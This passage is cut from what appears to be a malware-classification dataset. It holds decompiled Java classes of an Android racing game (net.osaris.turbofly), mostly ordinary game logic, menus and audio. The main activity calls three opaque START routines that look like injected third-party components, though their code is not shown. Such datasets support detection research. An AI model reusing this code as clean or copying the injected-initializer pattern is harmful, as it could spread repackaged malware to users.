0.5d) * delta,0.5d),-0.5d));       decAngleYInfini=(float)(decAngleYInfini - Math.max(Math.min((decAngleYInfini * 0.5d) * delta,0.5d),-0.5d));       if (state != 2 && state != 3 && second >= 0 && !finished && !gameOver) {         if (lapTime0 == 0) {           lapTime0=getTime();         }         long now=getTime();         lapMinute=(int)(((now - lapTime0) / 1000) / 60.0d);         lapSecond=((int)((now - lapTime0) / 1000.0d)) % 60;         lapDixieme=(int)((now - lapTime0) / 100.0d);         if (enTete && mode == 0 && (lapMinute * 60) + lapSecond < 3) {           if (ennemiTime0 == 0) {             ennemiTime0=getTime();           }           ennemiMinute=(int)(((ennemiTime0 - lapTime0) / 1000) / 60.0d);           ennemiSecond=((int)((ennemiTime0 - lapTime0) / 1000.0d)) % 60;           ennemiDixieme=(int)((ennemiTime0 - lapTime0) / 100.0d);         }         if (mode == 2) {           player.params[3]=(float)(r12[3] + (5.0E-4d * delta));           player.vieRestante=(float)(r12.vieRestante + (0.1d * delta));           player.vieRestante=Math.min(player.vieRestante,10.0f);           if (player.vieRestante < 0.0f) {             gameOver=true;             state=3;           }         }         if (player.z > Piste.tailleCircuit) {           if (mode == 0) {             lapTime0=0L;           }           lastLapSecond=lapSecond;           lastLapMinute=lapMinute;           lastLapDixieme=lapDixieme;           lapsDone++;           if (lapsDone + 1 == nbLaps && mode == 0) {             last.play(1.0f,1.0f);           }           angleY-=player.segment.angleY;           decAngleInfini-=player.segment.angle;           decAngleYInfini+=player.segment.angleY;           player.nowOnZ(player.z - Piste.tailleCircuit);           angleY+=player.segment.angleY;           decAngleInfini+=player.segment.angle;           decAngleYInfini-=player.segment.angleY;           enTete=true;           for (int i=0; i < nbEnnemis; i++) {             ennemis[i].nowOnZ(ennemis[i].z - Piste.tailleCircuit);             if (ennemis[i].missileLaunched) {               ennemis[i].missile.nowOnZ(ennemis[i].missile.z - Piste.tailleCircuit);             }             if (ennemis[i].z > player.z) {               enTete=false;             }           }           if (!enTete) {             long now1=getTime();             ennemiMinute=(int)(((now1 - ennemiTime1) / 1000) / 60.0d);             ennemiSecond=((int)((now1 - ennemiTime1) / 1000.0d)) % 60;             ennemiDixieme=(int)((now1 - ennemiTime1) / 100.0d);           }           ennemiTime1=0L;           if (player.missileLaunched) {             player.missile.nowOnZ(player.missile.z - Piste.tailleCircuit);           }         }  else         if (mode == 0 && lapsDone == nbLaps - 1 && player.z > Piste.tailleCircuit - 16) {           finished=true;           if (pos == 1) {             state=3;           }  else {             state=2;           }         }  else         if (mode == 1 && player.z > ennemis[0].z + 30) {           state=3;         }  else         if (mode == 1 && player.z < ennemis[0].z - 30) {           state=2;           gameOver=true;         }       }       if (second == -3 && minute == 0 && mustDo(1,2000L) && RokonMusic.musicOn) {         RokonMusic.getMediaPlayer().start();       }       if (second < 0 && milli < 500 && mustDo(2,600L)) {         if (second == -3) {           go3.play(1.0f,1.0f);         }  else         if (second == -2) {           go2.play(1.0f,1.0f);         }  else         if (second == -1) {           go1.play(1.0f,1.0f);         }       }  else       if (second == 0 && minute == 0 && milli > 100 && mustDo(3,3000L)) {         go.play(1.0f,1.0f);       }       if (second == -3 && minute == 0 && RokonMusic.musicOn) {         RokonMusic.getMediaPlayer().setVolume(((float)milli) / 1000.0f,((float)milli) / 1000.0f);       }       if (second == -2 && minute == 0 && milli < 500 && mustDo(2,900L) && RokonMusic.musicOn) {         RokonMusic.getMediaPlayer().setVolume(1.0f,1.0f);       }       player.doPhysics(lastX,lastY,lastZ2,delta);       if (multi) {         MultiplayerAppliance.prepareSend();       }       if (eng != null) {         eng.setRate(Math.min(2.0f,Math.max(0.5f,player.vzb / 1.5f)));       }       if (player.isOn(Piste.boost[0]) || player.isOn(Piste.boost[1]) || player.isOn(Piste.boost[2])) {         player.vzb=player.params[3] + 0.7f;         if (mustDo(4,500L)) {           acc.play(1.0f);         }       }       if (multi) {         MultiplayerAppliance.applyAll();       }       boolean oneHasAdvenced=false;       for (int i2=0; i2 < nbEnnemis; i2++) {         ennemis[i2].doPhysics(0.0f,lastY,(-5.0f) * ennemis[i2].x,delta);         if (ennemis[i2].isOn(Piste.boost[0]) || ennemis[i2].isOn(Piste.boost[0]) || ennemis[i2].isOn(Piste.boost[0])) {           ennemis[i2].vzb=ennemis[i2].params[3] + 0.9f;         }         if (ennemis[i2].vzb > 1.2f * player.vzb && ennemis[i2].z >= player.z - 2 && ennemis[i2].z <= player.z + 3 && mustDo(9,500L)) {           acc.play(0.75f);         }         if (ennemis[i2].z > 0) {           oneHasAdvenced=true;         }         if (ennemis[i2].z > Piste.tailleCircuit && ennemiTime1 == 0) {           ennemiTime1=getTime();         }       }       if (!oneHasAdvenced) {         ennemiTime0=0L;       }       for (int i3=0; i3 < nbEnnemis; i3++) {         if (ennemis[i3].collide(player)) {           OsarisTools.vibrate();         }       }       if (!finished) {         pos=1;         for (int i4=0; i4 < nbEnnemis; i4++) {           if (ennemis[i4].z > player.z - 2 && ennemis[i4].z < player.z + 20) {             for (int j=i4 + 1; j < nbEnnemis; j++) {               ennemis[i4].collide(ennemis[j]);             }           }           if (ennemis[i4].z > player.z || (ennemis[i4].z == player.z && ennemis[i4].mTz > player.mTz)) {             pos++;           }         }       }       if (mustDo(10,50L)) {         VaisseauFactory.changeParticules();       }     }   }   private long getTime(){     return globalTime;   }   @Override public int getState(){     return state;   }   public void reLoadTrack(){     defColor=4;     defColor2=6;     System.out.println(""c'est parti, on recharge"");     System.out.println(""allez hop, la piste"");     Piste.init(circuitId);     for (    Vaisseau v : concurrents) {       VaisseauFactory.reMakeShip(v);       v.missile=VaisseauFactory.makeShip(5);       v.missileobj=v.missile;       v.mine=VaisseauFactory.makeShip(6);       v.missile.params[3]=player.params[3] + 1.4f;       v.mine.params[3]=0.0f;       v.setZ(v.z);     }     Piste.playerIsThereNow(player.z);     eng=engine.playContinuous(0.15f);     RokonMusic.play();     System.out.println(""jviens de relancer le moteur"");     if (state == 1) {       state=5;     }   }   public void restart(  int mode2){     if (circuitId != -1) {       loading=true;       defColor=4;       defColor2=6;       System.out.println(""c'est parti, on restart"");       mode=mode2;       Tracks.currentMode=mode2;       ennemiTime1=0L;       lapSecond=0;       lapMinute=0;       lapDixieme=0;       lapTime0=0L;       enTete=false;       ennemiSecond=0;       ennemiMinute=0;       ennemiDixieme=0;       ennemiTime0=0L;       this.decY=0.0f;       decAngleInfini=0.0f;       decAngleYInfini=0.0f;       help=0.0f;       lapsDone=0;       gameOver=false;       System.out.println(""allez hop, la piste"");       Piste.init(circuitId);       if (mode2 == 0) {         nbEnnemis=nbEnnemisNormal;       }  else       if (mode2 == 1) {         nbEnnemis=1;       }  else       if (mode2 == 2) {         nbEnnemis=0;       }       nbConcurrents=nbEnnemis + 1;       if (multi) {         nbConcurrents=nbPlayers;         nbEnnemis=nbPlayers;       }       ennemis=new Vaisseau[nbEnnemis];       concurrents=new Vaisseau[nbConcurrents];       finished=false;       lastTrack=circuitId;       lastMode=mode2;       scoreInfini=0;       lastZT=0.0f;       penalties=0;       second=-4;       minute=0;       milli=0L;       br=0;       bri=0.0f;       System.out.println(""bon, on va creer le player"");       player=VaisseauFactory.makeShip(vaisseau);       player.isPlayer=true;       player.x=1.0f;       player.setZ(1);       if (mode2 == 2) {         player.params[3]=JumpyBall.essai ? 1.4f : 1.4f;         player.x=0.0f;       }       player.vieRestante=10.0f;       System.out.println(""puis les ennemis aussi"");       if (mode2 == 1) {         for (int i=0; i < nbEnnemis; i++) {           ennemis[i]=VaisseauFactory.makeShip((vaisseau == 2 ? 1 : 0) + 2);           ennemis[i].x=-1.0f;           ennemis[i].params[2]=1.2f;           ennemis[i].params[1]=0.2f;           if (Tracks.mode == 0) {             ennemis[i].params[3]=(float)((VaisseauFactory.defaultParams[Tracks.lvlBaseship[Tracks.currentLvl]][3] * Tracks.lvlSpeed[Tracks.currentLvl]) + (0.01f * i));           }  else {             ennemis[i].params[3]=player.params[3] * (1.02f + (0.01f * i));           }           ennemis[i].params[4]=player.params[4] * (1.21f + (0.2f * i));           ennemis[i].setZ((i * 2) + 6);           concurrents[i]=ennemis[i];         }       }  else       if (multi) {         for (int i2=0; i2 < nbEnnemis; i2++) {           ennemis[i2]=VaisseauFactory.makeShip(vaisseau);           if (i2 != playerId) {             ennemis[i2].params[2]=1.5f;             ennemis[i2].params[1]=0.3f;           }           ennemis[i2].x=((i2 % 2) * 4) - 2;           ennemis[i2].setZ((i2 * 2) + 3);           concurrents[i2]=ennemis[i2];         }       }  else {         for (int i3=0; i3 < nbEnnemis; i3++) {           ennemis[i3]=VaisseauFactory.makeShip(i3 % 5);           ennemis[i3].x=((i3 % 2) * 4) - 2;           ennemis[i3].params[2]=1.2f;           ennemis[i3].params[1]=0.2f;           if (Tracks.mode == 0) {             ennemis[i3].params[3]=((float)(VaisseauFactory.defaultParams[Tracks.lvlBaseship[Tracks.currentLvl]][3] * 0.96d * Tracks.lvlSpeed[Tracks.currentLvl])) + (0.007f * i3);           }  else {             ennemis[i3].params[3]=(player.params[3] * 1.0f) + (0.007f * i3);           }           ennemis[i3].params[4]=player.params[4] * (1.2f + (0.2f * i3));           ennemis[i3].setZ((i3 * 2) + 3);           concurrents[i3]=ennemis[i3];         }       }       if (!multi) {         concurrents[nbConcurrents - 1]=player;       }       for (      Vaisseau v : concurrents) {         v.missile=VaisseauFactory.makeShip(5);         v.missileobj=v.missile;         v.mine=VaisseauFactory.makeShip(6);         v.missile.params[3]=player.params[3] + 1.4f;         v.mine.params[3]=0.0f;         v.yb=(float)(0.05000000074505806d + (Math.random() / 10.0d));       }       if (multi) {         player=ennemis[playerId];         ennemis[playerId].isPlayer=true;         ennemis[playerId]=ennemis[nbEnnemis - 1];         nbEnnemis--;         paused=true;         doPhysics(0.0f,0.0f,0.0f);       }       angleX=0.0f;       angleY=0.0f;       GLES10.glFogfv(2918,Piste.getSegments(20).getFog(0.0f),0);       System.out.println(""la musique"");       if (RokonMusic.musicOn) {         int r=(int)((JumpyBall.essai ? 6.0d : 6.0d) * Math.random());         if (mode2 == 0) {           r=(int)((JumpyBall.essai ? 6.0d : 17.0d) * Math.random());         }         if (r < 3) {           RokonMusic.prepare(""c2.MP3"",true);         }  else         if (r < 6) {           RokonMusic.prepare(""c3.MP3"",true);         }  else         if (r < 10) {           RokonMusic.prepare(""fuzion.MP3"",true);         }  else         if (r < 12) {           RokonMusic.prepare(""trippin.MP3"",true);         }  else         if (r < 14) {           RokonMusic.prepare(""c2.MP3"",true);           RokonMusic.getMediaPlayer().seekTo(142000);         }  else         if (r < 15) {           RokonMusic.prepare(""c3.MP3"",true);           RokonMusic.getMediaPlayer().seekTo(85000);         }  else         if (r < 16) {           RokonMusic.prepare(""c2.MP3"",true);           RokonMusic.getMediaPlayer().seekTo(85000);         }  else         if (r < 17) {           RokonMusic.prepare(""c3.MP3"",true);           RokonMusic.getMediaPlayer().seekTo(173000);         }         RokonMusic.getMediaPlayer().setVolume(0.0f,0.0f);       }       System.out.println(""c bon on est pret"");       loading=false;       eng=engine.playContinuous(0.15f);       System.out.println(""jviens de lancer le moteur"");       state=1;       hasDrawnOnce=false;     }   }   @Override public void surfaceCreated(){     if (!Text.initDone) {       Text.init(new Font(JumpyBall.COREAN ? ""NGEBS.ttf"" : ""font0.ttf""),new Font(JumpyBall.COREAN ? ""NGEBS.ttf"" : ""font0.ttf""));     }     this.PixelBuffer.order(ByteOrder.nativeOrder());     mLoading=new Sprite(128,128,""loading.png"",true);     go321=new Sprite[4];     go321[0]=new Sprite(Segment.MAX_NBPOINTS,128,""go.png"",true);     go321[3]=new Sprite(128,128,""go3.png"",true);     go321[2]=new Sprite(128,128,""go2.png"",true);     go321[1]=new Sprite(128,128,""go1.png"",true);     cross[0]=new Sprite(20,200,""cross3.png"",true);     cross[1]=new Sprite(21,306,""cross4.png"",true);     for (int i=2; i < nbCrosses; i++) {       cross[i]=new Sprite((i * 2) + 3,(i * 6) + 200,cross[i % 2].texture,true);     }     for (int i2=0; i2 < nbCrosses; i2++) {       xCrosses[i2]=(int)((Math.random() * 700.0d) - 350.0d);       yCrosses[i2]=((int)(Math.random() * 1500.0d)) - 1800;     }     vie=new Sprite(40,4,""vie.png"",true);     mort=new Sprite(39,3,""mort.png"",true);     close=new Sprite(64,64,""close.png"",true);     miss1=new Sprite(80,80,""missico.png"",true);     miss2=new Sprite(80,80,""miss2ico.png"",true);     mines=new Sprite(80,80,""minesico.png"",true);     boost=new Sprite(80,80,""boostico.png"",true);     rect=new Sprite(400,128,""rect.png"",true);     textures=new int[4];     GLES10.glGenTextures(4,textures,0);     SectionTypesBuilder.init();     VaisseauFactory.loadShips();     sprites.create(""lock1"",""lock.png"",0,0,96,96,true,true);     if (!okokDONTMOVEDONTMOVEDONTDOTHATNOOOOOOOOOOOOOOOOOOOOOO) {       ennemis=new Vaisseau[nbEnnemis];       new RokonAudio();       bip1=RokonAudio.singleton.createSoundFile(""smenu.wav"");       go=RokonAudio.singleton.createSoundFile(""go1.wav"");       go3=RokonAudio.singleton.createSoundFile(""three.wav"");       go2=RokonAudio.singleton.createSoundFile(""two.wav"");       go1=RokonAudio.singleton.createSoundFile(""one.wav"");       last=RokonAudio.singleton.createSoundFile(""last.wav"");       acc=RokonAudio.singleton.createSoundFile(""acc.wav"");       engine=RokonAudio.singleton.createSoundFile(""engine.wav"");       blam=RokonAudio.singleton.createSoundFile(""blam.wav"");       blip=RokonAudio.singleton.createSoundFile(""blip1.wav"");       missw=RokonAudio.singleton.createSoundFile(""miss.wav"");       expl=RokonAudio.singleton.createSoundFile(""sexpl.wav"");       boostsnd=RokonAudio.singleton.createSoundFile(""boost.wav"");       minesnd=RokonAudio.singleton.createSoundFile(""mine.wav"");     }     Piste.staticInit();     for (int i3=0; i3 < 10; i3++) {       Text.prepareNb(i3,31,defColor);       Text.prepareNb(i3,31,5);       Text.prepareNb(i3,31,7);     }     Text.prepare(""."",7,defColor,0);     Text.prepare(""."",7,5,0);     Text.prepare(""."",7,7,0);     Text.prepare(""+"",31,5,0);     Text.prepare(""-"",31,7,0);     Text.prepare(""/"",30,defColor,0);     Text.prepare(Messages.getString(R.string.InGameS54),20,defColor,0);     Text.prepare(Messages.getString(R.string.InGameS55),24,defColor,0);     Text.prepare(Messages.getString(R.string.InGameSPosition),20,defColor,0);     Text.prepare(Messages.getString(R.string.InGameS57),20,defColor,0);     okokDONTMOVEDONTMOVEDONTDOTHATNOOOOOOOOOOOOOOOOOOOOOO=true;   }   @Override public void setMatrix3D(){     super.setMatrix3D();     if (cockpitView) {       GLES10.glRotatef(player.angleZ * 0.5f,0.0f,0.0f,1.0f);       GLES10.glTranslatex(0,-32768,-131072);     }  else {       GLES10.glRotatef(player.angleZ * 0.15f,0.0f,0.0f,1.0f);       GLES10.glTranslatex(0,-157286,-131072);     }     GLES10.glRotatef(-170.0f,1.0f,0.0f,0.0f);     if (!cockpitView) {       GLES10.glTranslatex(-((int)(65536.0f * (((player.angleZ / 10.0f) - player.x) / 10.0f))),-45875,13107);     }  else {       GLES10.glTranslatex(0,58982,-170393);     }     if (player.vzb > player.params[3] + 0.2f) {       effacc=(float)(effacc + ((((player.vzb + 0.5f) - player.params[3]) - effacc) * 0.3d * delta));     }  else {       effacc=(float)(effacc - ((effacc * 0.6d) * delta));     }     if (effacc > 0.01d) {       GLES10.glTranslatex(0,0,(int)(65536.0f * (-effacc) * 0.3f));     }     if (JumpyBall.PC) {       GLES10.glRotatef(anglePCX,1.0f,0.0f,0.0f);       GLES10.glRotatef(anglePCY,0.0f,1.0f,0.0f);       GLES10.glRotatef(anglePCZ,0.0f,0.0f,1.0f);       GLES10.glTranslatef(movePCX,movePCY,movePCZ);     }   }   @Override public void setMatrix2D(){     super.setMatrix2D();     effblam=(float)(effblam - ((effblam * 0.6d) * delta));     GLES10.glTranslatex((int)(65536.0f * (width2D / 2.0f)),(int)(65536.0f * (height2D / 2.0f)),0);     if (effacc > 0.1d) {       GLES10.glScalef((effacc * 0.08f) + 1.0f,(effacc * 0.08f) + 1.0f,(effacc * 0.08f) + 1.0f);     }     if (effblam > 0.1d) {       effblamx=(float)(effblamx + ((Math.random() - 0.5d) * 1.6d * delta));       effblamy=(float)(effblamy + ((Math.random() - 0.5d) * 1.6d * delta));     }  else {       effblamx=(float)(effblamx - ((effblamx * 1.6d) * delta));       effblamy=(float)(effblamy - ((effblamy * 1.6d) * delta));     }     GLES10.glTranslatef(effblamx * 14.0f,effblamy * 14.0f,0.0f);   }   public void doTouchDown(  float x,  float y,  Context context){     if (iSortaWannaTakScreenzWHenWelYaKnowYaIsSortaTuchinOnDaScreen) {       stopAll=!stopAll;     }     if (player.hasWeapon != 0 && (((controlMode != 1 || JumpyBall.blackberry) && x > 640.0f && y > 176.0f && y < 304.0f) || (controlMode == 1 && !JumpyBall.blackberry && x > 640.0f && y > 32.0f && y < 160.0f))) {       player.launchWeapon();       return;     }     if (x < 400.0f && controlMode == 1) {       lastZT=-30.0f;       return;     }     if (x <= 400.0f || controlMode != 1) {       return;     }     if (x <= 640.0f || y <= 32.0f || y >= 160.0f) {       lastZT=30.0f;     }   }   public void doTouchUp(  float x,  float y,  Context context){     if (state == 5) {       state=1;     }     if (!multi) {       paused=false;     }     if (controlMode == 1) {       lastZT=0.0f;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\JumpyBall.code","public class JumpyBall extends Activity {   public static final boolean LANDSCAPE=true;   public static Activity instance=null;   public static final int resX=800;   public static final int resY=480;   public static float sysout2;   public static float sysout4;   private GLSurface mGLSurfaceView;   private Sensor mSensor;   private SensorManager mSensorManager;   public static String sysout1="""";   public static String sysout3="""";   public static boolean PC=false;   public static boolean dev=false;   public static boolean KEYONLY=false;   public static boolean COREAN=false;   public static boolean chinese=false;   public static boolean japanese=false;   public static boolean essai=false;   public static boolean blackberry=false;   public static String fullURL=""market://search?q=pname:net.osaris.turbofly"";   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     bp.START(this);     mjol.START(this);     st.START(this);     setVolumeControlStream(3);     instance=this;     setFullscreen();     DisplayMetrics metrics=new DisplayMetrics();     getWindowManager().getDefaultDisplay().getMetrics(metrics);     GLSurface.defOrientation=getWindowManager().getDefaultDisplay().getRotation();     OsarisTools.init(this);     this.mSensorManager=(SensorManager)getSystemService(""sensor"");     this.mGLSurfaceView=new GLSurface(this,metrics.widthPixels,metrics.heightPixels);     GLSurface.state=1;     this.mGLSurfaceView.setRenderer(new SplashScreen(false,this.mGLSurfaceView));     GLSurface.inGame=new InGame(false);     GLSurface.menu=new Menu(false);     setContentView(this.mGLSurfaceView);   }   @Override protected void onPause(){     RokonMusic.onPause();     if (InGame.eng != null) {       InGame.eng.stop();     }     super.onPause();     this.mSensorManager.unregisterListener(this.mGLSurfaceView);     this.mGLSurfaceView.onPause();   }   public void setFullscreen(){     requestWindowFeature(1);     getWindow().setFlags(1024,1024);   }   public void setNoTitle(){     requestWindowFeature(1);   }   @Override protected void onResume(){     super.onResume();     this.mSensor=this.mSensorManager.getDefaultSensor(1);     this.mGLSurfaceView.onResume();     this.mSensorManager.registerListener(this.mGLSurfaceView,this.mSensor,0);   }   @Override public boolean onKeyDown(  int keyCode,  KeyEvent msg){     return this.mGLSurfaceView.onKeyDown(keyCode,msg);   }   @Override public boolean onKeyUp(  int keyCode,  KeyEvent msg){     return this.mGLSurfaceView.onKeyUp(keyCode,msg);   }   @Override public boolean onTouchEvent(  MotionEvent event){     event.getAction();     return false;   }   @Override public void finish(){     onPause();     GLSurface.state=1;     super.finish();   }   @Override protected void onSaveInstanceState(  Bundle outState){     super.onSaveInstanceState(outState);     Log.w(getClass().getName(),""SIS called"");   }   @Override protected void onDestroy(){     onPause();     super.onDestroy();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\Menu.code","public class Menu extends Osaris2D3D {   public static final int CAREER=10;   public static final int CREDITS=5;   public static final int EPREUVE=12;   public static final int GARAGE=11;   public static final int LEVELS=2;   public static final int MAIN=1;   public static final int MESSAGE=13;   public static final int OPTIONS=3;   public static final int RACETYPE=7;   public static final int SETTINGS=6;   public static final int SETTINGSCONTROL=15;   public static final int SETTINGSSON=14;   public static final int VAISSEAUX=4;   private static Sprite ba=null;   private static Sprite bb=null;   private static Sprite bouton=null;   private static Sprite[] cross=null;   static int dec2=0;   private static Dialog dialog=null;   static int i=0;   static int j=0;   private static String[][] menus=null;   static int nbCrosses=0;   public static final int nbVaisseaux=5;   static int selectedButon;   private static Vaisseau[] vaisseaux;   static int[] xCrosses;   static float[] yCrosses;   GLSurface GLSV;   private Sprite bas;   private Sprite circuit;   boolean doitChargerCircuit=false;   private Sprite fond;   private Sprite haut;   private Sprite lock;   private Sprite vcap;   private static String lScore=null;   private static InGame game=null;   public static int state=1;   public static int[] nbUnlocked=new int[2];   private static int bestmin=0;   private static int bestsec=0;   static float dec=0.0f;   static int size=64;   public static int levelMode=1; static {     String[][] strArr=new String[16];     strArr[0]=new String[0];     String[] strArr2=new String[4];     strArr2[0]=Messages.getString(R.string.MenuS0);     strArr2[1]=Messages.getString(R.string.MenuS1);     strArr2[2]=Messages.getString(R.string.MenuS2);     strArr2[3]=Messages.getString(R.string.MenuS3);     strArr[1]=strArr2;     String[] strArr3=new String[4];     strArr3[0]="""";     strArr3[1]="""";     strArr3[2]="""";     strArr3[3]=JumpyBall.KEYONLY ? """" : Messages.getString(R.string.MenuS7);     strArr[2]=strArr3;     strArr[3]=new String[0];     String[] strArr4=new String[4];     strArr4[0]="""";     strArr4[1]="""";     strArr4[2]="""";     strArr4[3]=JumpyBall.KEYONLY ? """" : Messages.getString(R.string.MenuS11);     strArr[4]=strArr4;     String[] strArr5=new String[4];     strArr5[0]="""";     strArr5[1]="""";     strArr5[2]="""";     strArr5[3]="""";     strArr[5]=strArr5;     String[] strArr6=new String[4];     strArr6[0]="""";     strArr6[1]="""";     strArr6[2]="""";     strArr6[3]="""";     strArr[6]=strArr6;     String[] strArr7=new String[4];     strArr7[0]=Messages.getString(R.string.MenuS20);     strArr7[1]=Messages.getString(R.string.MenuS21);     strArr7[2]=Messages.getString(R.string.MenuS22);     strArr7[3]="""";     strArr[7]=strArr7;     String[] strArr8=new String[4];     strArr8[0]="""";     strArr8[1]="""";     strArr8[2]="""";     strArr8[3]="""";     strArr[8]=strArr8;     String[] strArr9=new String[4];     strArr9[0]="""";     strArr9[1]="""";     strArr9[2]="""";     strArr9[3]="""";     strArr[9]=strArr9;     String[] strArr10=new String[4];     strArr10[0]="""";     strArr10[1]="""";     strArr10[2]="""";     strArr10[3]=JumpyBall.KEYONLY ? """" : Messages.getString(R.string.MenuS35);     strArr[10]=strArr10;     String[] strArr11=new String[4];     strArr11[0]="""";     strArr11[1]="""";     strArr11[2]="""";     strArr11[3]="""";     strArr[11]=strArr11;     String[] strArr12=new String[4];     strArr12[0]="""";     strArr12[1]="""";     strArr12[2]="""";     strArr12[3]="""";     strArr[12]=strArr12;     String[] strArr13=new String[4];     strArr13[0]="""";     strArr13[1]="""";     strArr13[2]="""";     strArr13[3]="""";     strArr[13]=strArr13;     String[] strArr14=new String[4];     strArr14[0]="""";     strArr14[1]="""";     strArr14[2]="""";     strArr14[3]="""";     strArr[14]=strArr14;     String[] strArr15=new String[4];     strArr15[0]=Messages.getString(R.string.MenuS52);     strArr15[1]=Messages.getString(R.string.MenuS53);     strArr15[2]=Messages.getString(R.string.MenuS54);     strArr15[3]=Messages.getString(R.string.MenuS55);     strArr[15]=strArr15;     menus=strArr;     selectedButon=0;     nbCrosses=40;     xCrosses=new int[nbCrosses];     yCrosses=new float[nbCrosses];     cross=new Sprite[nbCrosses];   }   public Menu(  boolean useTranslucentBackground){   }   @Override public void drawFrame(){     size=80;     time();     dec+=delta * 2.0f;     dec%=65536.0f;     GLES10.glClearColor(0.0f,0.0f,0.0f,1.0f);     initGL();     setMatrix2D();     this.fond.draw(0,0);     if (JumpyBall.dev) {       Text.draw(""DEV VERSION - NOT FOR RELEASE"",20,455,16,0);     }     setMatrixMenu();     for (int i2=0; i2 < nbCrosses; i2++) {       cross[i2].draw(xCrosses[i2] - 400,yCrosses[i2] - 240.0f);       yCrosses[i2]=(float)(r9[i2] + ((10.0d + (i2 * 6.0d)) * delta * 0.2d));       if (yCrosses[i2] > 300.0f) {         xCrosses[i2]=((int)(Math.random() * 700.0d)) - 100;         yCrosses[i2]=-800.0f;       }     }     setMatrix2D();     this.haut.draw(20,10);     int i3=0;     while (i3 < 4) {       if (state < menus.length && i3 < menus[state].length && menus[state][i3] != null && !menus[state][i3].equals("""")) {         bouton.draw(44,(size * i3) + 136);         Text.draw(menus[state][i3],48,(i3 * 80) + 158,26,selectedButon == i3 ? 1 : 0);       }       i3++;     }     if (state != 1 && state != 5 && state != 13 && JumpyBall.blackberry && !JumpyBall.KEYONLY) {       bouton.draw(451,376);       Text.draw(""BACK"",560,398,26,selectedButon == 6 ? 1 : 0);     }     if (state == 1) {       sprites.drawSprite(""bas"");       return;     }     if (state == 5) {       Text.draw(Messages.getString(R.string.MenuS58),48,140,22,3);       Text.draw(Messages.getString(R.string.MenuS59),48,220,22,3);       Text.draw(Messages.getString(R.string.MenuS61),48,380,22,3);       Text.draw(Messages.getString(R.string.MenuS62),100,178,22,0);       Text.draw(Messages.getString(R.string.MenuS63),300,218,22,0);       Text.draw(Messages.getString(R.string.MenuS64),100,258,22,0);       Text.draw(Messages.getString(R.string.MenuS65),100,298,22,0);       Text.draw(Messages.getString(R.string.MenuS66),100,338,22,0);       Text.draw(Messages.getString(R.string.MenuS67),100,418,22,0);       sprites.drawSprite(""bas"");       return;     }     if (state == 10) {       if (this.doitChargerCircuit) {         if (this.circuit.texture != -1) {           this.circuit.destroy();         }         int texture=TextureUtil.loadTexture(Tracks.trackTexture[Tracks.lvlTrack[Tracks.currentLvl]]);         this.circuit.texture=texture;       }       this.circuit.draw(127,190);       if (Tracks.currentLvl > 0) {         sprites.drawSprite(""left"");       }       if ((milli > 500 || Tracks.currentLvl >= Tracks.nbUnlocked - 1) && Tracks.currentLvl < Tracks.nbLvls - 1) {         sprites.drawSprite(""right"");       }       if (Tracks.currentLvl >= Tracks.nbUnlocked && milli > 500) {         sprites.drawSprite(""lock"");       }       String number=(Tracks.currentLvl + 1) + ""."";       Text.draw(number,48,150,24,1);       Text.draw(Tracks.trackNames[Tracks.lvlTrack[Tracks.currentLvl]],120,150,24,3);       Text.draw(Messages.getString(R.string.MenuS74),450,290,24,1);       Text.draw(lScore,450,330,24,3);       if (Tracks.lvlType[Tracks.currentLvl] == 0) {         Text.draw(Messages.getString(R.string.MenuS75),450,160,24,1);         Text.draw(Messages.getString(R.string.MenuS76),450,200,20,3);         String finish=Messages.getString(R.string.MenuS77,Integer.valueOf(Tracks.lvlScore[Tracks.currentLvl]));         Text.draw(finish,450,230,20,3);         return;       }       if (Tracks.lvlType[Tracks.currentLvl] == 1) {         Text.draw(Messages.getString(R.string.MenuS79),450,160,24,1);         Text.draw(Messages.getString(R.string.MenuS80),450,200,20,3);         String finish2=Messages.getString(R.string.MenuS81,Integer.valueOf(Tracks.lvlScore[Tracks.currentLvl] * 10));         Text.draw(finish2,450,230,18,3);         return;       }       if (Tracks.lvlType[Tracks.currentLvl] == 2) {         Text.draw(Messages.getString(R.string.MenuS85),450,160,24,1);         Text.draw(Messages.getString(R.string.MenuS86),450,200,20,3);         String finish3=String.valueOf("""") + Messages.getString(R.string.MenuS4,Integer.valueOf(Tracks.lvlScore[Tracks.currentLvl]));         Text.draw(finish3,450,230,20,3);         return;       }       return;     }     if (state == 4) {       GLES10.glEnable(2929);       setMatrix3D();       vaisseaux[InGame.vaisseau].angleX=230.0f;       vaisseaux[InGame.vaisseau].angleY=30.0f;       vaisseaux[InGame.vaisseau].angleZ=0.0f;       vaisseaux[InGame.vaisseau].draw();       GLES10.glDisable(2929);       setMatrix2D();       if (InGame.vaisseau > 0) {         sprites.drawSprite(""left"");       }       if ((milli > 500 || InGame.vaisseau >= Tracks.nbShipUnlocked - 1) && InGame.vaisseau < 4) {         sprites.drawSprite(""right"");       }       if (InGame.vaisseau >= Tracks.nbShipUnlocked && milli > 500) {         sprites.drawSprite(""lock"");       }       int s1=JumpyBall.blackberry ? 80 : 90;       int s2=JumpyBall.blackberry ? 130 : 138;       int s3=JumpyBall.blackberry ? 40 : 35;       Text.draw(Messages.getString(R.string.MenuS94),450,(s1 * 0) + s2,24,3);       this.vcap.draw(450,(((s1 * 0) + s2) + s3) - 5);       for (int i4=0; i4 < vaisseaux[InGame.vaisseau].params[3] * 15.0f; i4++) {         this.vcap.drawAgain((i4 * 8) + 450,(((s1 * 0) + s2) + s3) - 5);       }       Text.draw(Messages.getString(R.string.MenuS95),450,(s1 * 1) + s2,24,3);       this.vcap.draw(450,(((s1 * 1) + s2) + s3) - 5);       for (int i5=0; i5 < vaisseaux[InGame.vaisseau].params[4] * 160.0f; i5++) {         this.vcap.drawAgain((i5 * 8) + 450,(((s1 * 1) + s2) + s3) - 5);       }       Text.draw(Messages.getString(R.string.MenuS96),450,(s1 * 2) + s2,24,3);       this.vcap.draw(450,(((s1 * 2) + s2) + s3) - 5);       for (int i6=0; i6 < vaisseaux[InGame.vaisseau].params[1] * 100.0f; i6++) {         this.vcap.drawAgain((i6 * 8) + 450,(((s1 * 2) + s2) + s3) - 5);       }       return;     }     if (state == 2) {       if (this.doitChargerCircuit) {         if (this.circuit.texture != -1) {           this.circuit.destroy();         }         int texture2=TextureUtil.loadTexture(Tracks.trackTexture[Tracks.currentTrack]);         